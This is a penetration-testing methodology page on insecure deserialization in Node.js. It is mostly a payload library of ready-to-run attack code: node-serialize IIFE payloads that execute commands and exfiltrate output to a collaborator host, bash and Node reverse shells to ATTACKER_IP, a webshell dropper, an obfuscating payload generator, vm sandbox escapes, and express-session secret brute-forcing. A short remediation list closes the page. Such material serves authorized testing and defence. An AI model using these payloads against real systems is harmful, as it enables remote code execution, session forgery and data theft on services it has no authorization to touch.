---
title: "Insecure Deserialization — Node.js"
date: 2026-02-24
draft: false
---

# Insecure Deserialization — Node.js

> **Severity**: Critical | **CWE**: CWE-502
> **OWASP**: A08:2021 – Software and Data Integrity Failures

---

## What Is Node.js Deserialization?

Unlike Java/PHP, Node.js doesn't have a single dominant serialization format. Vulnerabilities arise in:

1. **`node-serialize`** — uses IIFE pattern (`_$$ND_FUNC$$_`) to embed executable functions
2. **`cryo`** — serializes functions, exploitable via custom class injection
3. **`serialize-javascript`** — meant for safe serialization but misused
4. **`__proto__` pollution via JSON.parse** — not deserialization per se but JSON-triggered prototype pollution
5. **`vm` module escape** — sandbox breakout when deserializing into vm context
6. **Cookie/session forgery** — `express-session` with weak secret, `cookie-parser` with known secret

```javascript
// node-serialize vulnerable pattern:
var serialize = require('node-serialize');
var data = cookieParser.parse(req.headers.cookie)['profile'];
var obj = serialize.unserialize(data);  // ← RCE if IIFE in data
```

---

## Discovery Checklist

**Phase 1 — Identify Serialization**
- [ ] Check cookies for base64-encoded JSON with `_$$ND_FUNC$$_` patterns
- [ ] Check POST bodies/cookies for JSON blobs with function signatures
- [ ] Look for `node-serialize`, `cryo`, `serialize-javascript` in `package.json`
- [ ] Find `serialize.unserialize()`, `cryo.parse()` calls in source
- [ ] Check `express-session` secret strength → session cookie forgery
- [ ] Check JWT secret (see 28_JWT.md) — often same issue
- [ ] Check `cookie-parser` signed cookies — `s:` prefix means signed

**Phase 2 — Test**
- [ ] Inject `_$$ND_FUNC$$_function(){return 7*7;}()` in serialized field → check if 49 appears
- [ ] Test prototype pollution via JSON body (see 55/56_ProtoPollution)
- [ ] Test cookie modification: decode → modify → re-encode → test
- [ ] Test `__proto__` key in any JSON-parsed user input

---

## Payload Library

### Payload 1 — `node-serialize` RCE via IIFE

```javascript
// node-serialize IIFE (Immediately Invoked Function Expression) pattern:
// When a function is stored as: {"key": "_$$ND_FUNC$$_function(){...}()"}
// The trailing () means it executes immediately on unserialize()

// Basic RCE payload (JSON object):
{
  "rce": "_$$ND_FUNC$$_function(){require('child_process').exec('id',function(error,stdout){console.log(stdout)});}()"
}

// Base64-encoded for cookie injection:
python3 -c "
import base64, json

payload = {
  'rce': '_\$\$ND_FUNC\$\$_function(){require(\"child_process\").exec(\"id\",function(error,stdout,stderr){require(\"http\").get(\"http://COLLABORATOR_ID.oast.pro/?o=\"+Buffer.from(stdout).toString(\"base64\"))});}()'
}
encoded = base64.b64encode(json.dumps(payload).encode()).decode()
print(encoded)
"

# Reverse shell via IIFE:
{
  "rce": "_$$ND_FUNC$$_function(){require('child_process').exec('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"');}()"
}

# File write (drop webshell):
{
  "rce": "_$$ND_FUNC$$_function(){require('fs').writeFileSync('/var/www/html/shell.js','require(\"child_process\").exec(require(\"url\").parse(require(\"url\").parse(require(\"http\").IncomingMessage.prototype.url).query).cmd,function(e,s){process.stdout.write(s)})');}()"
}

# OOB DNS detection:
{
  "rce": "_$$ND_FUNC$$_function(){require('dns').lookup('COLLABORATOR_ID.oast.pro',function(){});}()"
}
```

### Payload 2 — Crafting Payloads with nodejsshell.py

```python
# Tool: nodejsshell.py — generates node-serialize RCE payload
# https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py

import sys

ip = "ATTACKER_IP"
port = "4444"

# Generate Node.js reverse shell:
padding = "A" * 1
payload = """\
_$$ND_FUNC$$_function (){
  eval(String.fromCharCode("""

reverse = f"""
var net = require('net'), cp = require('child_process'), sh = cp.spawn('/bin/sh', []);
var client = new net.Socket();
client.connect({port}, '{ip}', function(){{
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
}});
"""

char_codes = ",".join(str(ord(c)) for c in reverse)

payload += char_codes + "))}()"

print(f'{{"rce":"{payload}"}}')
```

### Payload 3 — `cryo` Library Exploitation

```javascript
// cryo serializes class instances — if user-controlled data is cryo.parse()'d:
// cryo format includes constructor name and properties

// Craft malicious cryo payload:
// cryo serializes as: {"root":"_cryo_DATE_1635000000000"}
// Exploit via __proto__ pollution in cryo's parse function:

// Generate with cryo:
var cryo = require('cryo');
var Exploit = function() {
  this.cmd = 'id';
};
Exploit.prototype.toString = function() {
  return require('child_process').execSync(this.cmd).toString();
};
console.log(cryo.stringify(new Exploit()));
// Submit as user input → if deserialized + toString() called → RCE

// Craft without running cryo (manually):
// cryo stores: {"root":"_cryo_CustomClass_INSTANCE","customs":{"_cryo_CustomClass_INSTANCE":{"cmd":"id"}}}
```

### Payload 4 — `express-session` Forgery

```bash
# express-session signs cookies with a secret
# Signed cookie format: s:SESSION_DATA.SIGNATURE
# URL-decoded: s:eyJ1c2VyIjoiZ3Vlc3QifQ==.HMACSHA256_SIGNATURE

# Extract session data:
COOKIE="s%3AeyJ1c2VyIjoiZ3Vlc3QifQ%3D%3D.SIGNATURE"
# URL decode, strip "s:" prefix, base64 decode session:
python3 -c "
import urllib.parse, base64
c = urllib.parse.unquote('$COOKIE')
c = c[2:]  # strip s:
data = c.split('.')[0]
print(base64.b64decode(data + '=='))
"
# → {"user":"guest","role":"user"}

# Forge admin session (need secret):
# Brute force secret with express-session-cookie-tool or custom script:
python3 -c "
import hmac, hashlib, base64, urllib.parse

session_data = base64.b64encode(b'{\"user\":\"admin\",\"role\":\"admin\"}').decode()
# Try common secrets:
for secret in ['secret', 'keyboard cat', 'your-secret-key', 'SESSION_SECRET', 'express']:
    sig = hmac.new(secret.encode(), session_data.encode(), hashlib.sha256)
    print(f's:{session_data}.{base64.b64encode(sig.digest()).decode()}')
"

# cookie-signature brute force:
npm install -g cookie-cracker  # if available
# Or use wordlist:
for secret in $(cat /usr/share/wordlists/rockyou.txt); do
  python3 -c "
import hmac, hashlib, base64
secret = '$secret'
data = 'SESSION_DATA_BASE64'
sig = hmac.new(secret.encode(), data.encode(), hashlib.sha256).digest()
print(base64.b64encode(sig).decode())
" 2>/dev/null | grep "EXPECTED_SIGNATURE" && echo "SECRET: $secret" && break
done
```

### Payload 5 — `vm` Module Sandbox Escape

```javascript
// If app runs user code in vm.runInNewContext() — sandbox escape:

// Basic sandbox escape:
const vm = require('vm');
const sandbox = {};
const context = vm.createContext(sandbox);
// User supplies this code:
const code = `
this.constructor.constructor('return process')().env
`;
vm.runInContext(code, context);
// → Access to process object → RCE

// Full RCE via sandbox escape:
const escapeCode = `
(function(){
  const f = this.constructor.constructor;
  const process = f('return process')();
  return process.mainModule.require('child_process').execSync('id').toString();
})()
`;

// More robust escape:
const escapeCode2 = `
const ForeignFunction = this.constructor.constructor;
const process1 = ForeignFunction("return process")();
const require1 = process1.mainModule.require;
const child_process = require1("child_process");
child_process.exec("id", function(err, data) {
  // exfil via DNS or HTTP
  require1("http").get("http://COLLABORATOR_ID.oast.pro/?o=" + Buffer.from(data).toString("base64"));
});
`;
```

### Payload 6 — `serialize-javascript` Bypass

```javascript
// serialize-javascript is meant for safe serialization to JS strings
// But if eval()'d or used with Function() constructor:

// If app does: eval(serialize_js_output):
// Inject via serialized regex:
{
  "x": {"_type":"regexStr","regex":"/;process.mainModule.require('child_process').exec('id')/"}
}

// Or via function serialization (if functions allowed):
{
  "fn": "function(){return require('child_process').execSync('id').toString()}"
}
// If deserialized with eval → executes function → RCE
```

---

## Tools

```bash
# node-serialize exploit generator:
# npm install node-serialize

node -e "
var serialize = require('node-serialize');
var payload = {
  'rce': '_\$\$ND_FUNC\$\$_function(){require(\"child_process\").exec(\"id\",function(e,s){console.log(s)})}()'
};
console.log(Buffer.from(JSON.stringify(payload)).toString('base64'));
"

# Detect node-serialize in npm packages:
grep -r "node-serialize\|cryo\|serialize-javascript" package.json package-lock.json 2>/dev/null

# Check for IIFE pattern in cookies:
# Look for: _$$ND_FUNC$$_ in base64 decoded cookies
python3 -c "
import base64
cookie = 'YOUR_COOKIE_BASE64'
decoded = base64.b64decode(cookie + '==').decode()
print(decoded)
print()
if '_\$\$ND_FUNC\$\$_' in decoded:
    print('[VULN] node-serialize IIFE pattern detected!')
"

# Burp Suite:
# Decode cookie (base64) → check for _$$ND_FUNC$$_
# Modify and re-encode → test RCE with harmless payload first

# express-session secret brute force:
git clone https://github.com/nicowillis/express-session-cracker 2>/dev/null || true
# Or manual with python3 hmac

# fickling equivalent for node:
node -e "
var code = process.argv[1];
try { eval(code); } catch(e) { console.error(e); }
" -- "require('child_process').execSync('id').toString()"

# Source code audit:
grep -rn "unserialize\|cryo\.parse\|eval(" --include="*.js" src/ | \
  grep -v "node_modules\|\.test\."

grep -rn "node-serialize\|cryo\|serialize-javascript" \
  node_modules/.bin/ 2>/dev/null
```

---

## Remediation Reference

- **Never use `node-serialize`** on untrusted data — no safe mode exists; replace with `JSON.stringify/parse`
- **Audit `package.json`**: remove `node-serialize`, `cryo` if present; prefer plain JSON
- **`express-session` secrets**: use cryptographically random 256-bit secrets; rotate them; store in environment variables not source code
- **`vm` module**: it is NOT a security sandbox — use `isolated-vm` npm package for actual sandboxing
- **Prototype pollution** (JSON.parse): freeze Object.prototype, use schema validation before parsing user JSON
- **JSON.parse safety**: validate schema before acting on parsed objects; reject `__proto__`, `constructor`, `prototype` keys

*Part of the Web Application Penetration Testing Methodology series.*
